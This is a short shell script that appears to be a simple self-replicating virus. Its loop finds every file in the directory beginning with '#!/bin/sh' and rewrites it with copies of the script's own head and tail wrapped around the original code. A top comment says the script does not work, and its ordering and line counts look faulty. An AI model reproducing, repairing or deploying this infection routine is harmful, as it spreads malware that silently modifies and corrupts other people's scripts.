# ACHTUNG! This shell script DOESN`T WORK!!!!!
#!/bin/sh
start
# host code ...
start () {
for F in *
do
  if [ "$(head -c9 $F 2>/dev/null)" = "#!/bin/sh" ]
  then
        HOST=$(cat $F|tr '\n' \xc7)
        head -3 $0 > $F 2>/dev/null
        echo $HOST | tr \xc7 '\n' >> $F 2>/dev/null
        tail -12 $0 >> $F
  fi
done
}
